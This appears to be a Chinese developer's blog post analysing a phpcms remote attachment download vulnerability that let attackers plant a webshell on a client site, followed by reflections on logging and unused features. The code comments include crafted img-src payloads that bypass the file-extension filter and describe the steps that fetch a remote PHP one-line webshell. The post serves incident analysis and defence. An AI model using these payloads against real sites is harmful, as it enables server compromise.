---
title: phpcms-attachment
date: phpcms 附件远程下载漏洞
categories: 
- 工作
tags:
- phpcms
---
没有什么是绝对安全的，能做的就是更好的码代码，提前减少漏洞，等漏洞出现了也别逃避，理解攻击过程，修复漏洞  
<!-- more -->
www.×××.com 网站被挂马了，找找问题呢  
距离上次的头像漏洞也有挺长一段时间了，至少那一次学习到了一些方法，关键的时刻还是有些摸不着套多的头绪，最为主要的分析途径还是日志，但实际面对日志时还是有些手足无措。  

### 安全监控
及时部署安全监控，在被攻击的时候有一定的防御作用，也能起到一定的监控作用，便于后续的问题查找，至少经历这两次问题最能发现问题的地方就在于日志，相应的安全新闻也能起到一些辅助作用。  

部署在云服务器上的一个项目最近也常常报安全漏洞，仅仅是一个展示项目也就没有太在意。每天几乎都有被攻击的安全提醒，sql注入、代码执行等形式。不被使用的功能最好不要部署，或许下一次就被攻击者利用了。  

### 漏洞端倪
用户注册功能对于我们的客户网站，这个功能很少被使用，通常后期极少客户增值后者有在定制中看到使用，没有太多关注攻击手段，防御从何谈起？  
攻击者利用上传漏洞，通过日志发现是 `/index.php m=member&c=index&a=register&siteid=1` 会员模块下的注册功能，直接工具模拟提交数据，对于开源的程序，能看到问题所在，自然也能利用漏洞。  

深入整个逻辑分析一下问题：  
* 攻击入口方法 `register`
    方法前段都是处理接收的参数，后续有一段对于 附表信息的处理
    ```
        //附表信息验证 通过模型获取会员信息
        if($member_setting['choosemodel']) {
            require_once CACHE_MODEL_PATH.'member_input.class.php';
            require_once CACHE_MODEL_PATH.'member_update.class.php';
            $member_input = new member_input($userinfo['modelid']);		
            $_POST['info'] = array_map('new_html_special_chars',$_POST['info']);
            //$_POST['info']['content'] = '<img src="http://phpcms.localhost/i.php/\\\pngjpeg#.png" />';
            $_POST['info']['content'] = '<img src="http://phpcms.localhost/i.txt?.ph%70%70%70/\\\pngjpeg#.jpg" />';
            $user_model_info = $member_input->get($_POST['info']);
            exit;			        				
        }
    ```

* `member_input.class.php` 中可以更改模型
    代码分析：  
    ```
        // 初始化的时候 传入modelid
        $member_input = new member_input($userinfo['modelid']);
        // $userinfo['modelid'] 这个参数是可以通过 POST 提交过来的
        $userinfo['modelid'] = isset($_POST['modelid']) ? intval($_POST['modelid']) : 10;
        // 攻击者主动修改 modelid ,让该模型中其包含 content
        // member_input实例方法get中 有一个动态方法 $fun
        if(method_exists($this, $func)) $value = $this->$func($field, $value);
        // 当 $field 为 content 的时候，$func 为 editor

        // 方法前段有一个判断，$data['islink'] 不存在或者取不等于 1 的值
        $debar_filed = array('catid','title','style','thumb','status','islink','description');
		if($data['islink']==1 && !in_array($field,$debar_filed)) continue;
        
        // editor 方法中有一个很关键的代码，这个也就是问题所在
        $value = $this->attachment->download('content', $value,$watermark_enable);

        // download 方法中可以利用一些特殊命名的链接来实现突破
        // 第一层过滤，模拟提交内容 <img src="http://phpcms.localhost/i.php#.png" />，通过匹配后文会用到 链接 http://phpcms.localhost/i.php#.png ，由于只有下面一条验证，后文取到的文件后缀就是 php ,远程文件 i.php 里面的内容就是攻击者的上传一句话木马
        if(!preg_match_all("/(href|src)=([\"|']?)([^ \"'>]+\.($ext))\\2/i", $string, $matches)) return $value;

        // 最后由于没有关闭日志输出到页面上，会直接显示 sql 执行失败信息，sql中包含上传的文件的路径
    ```

![](http://wx4.sinaimg.cn/large/e6cd2709gy1ffab1ge1kcj20km08zt9k.jpg)  

### 反思
1. 如果关闭日志显示会不会好一些？  
能表面解决问题，让对方不知道文件名，但是可以写一个脚本不停尝试，问题还是问题  

2. 不用的功能尽量“不用”  
有些功能虽然没有，但他却是会带来一些问题  

3. 涉及文件处理的地方很关键  

思绪万千，提笔无墨，就到这里。  
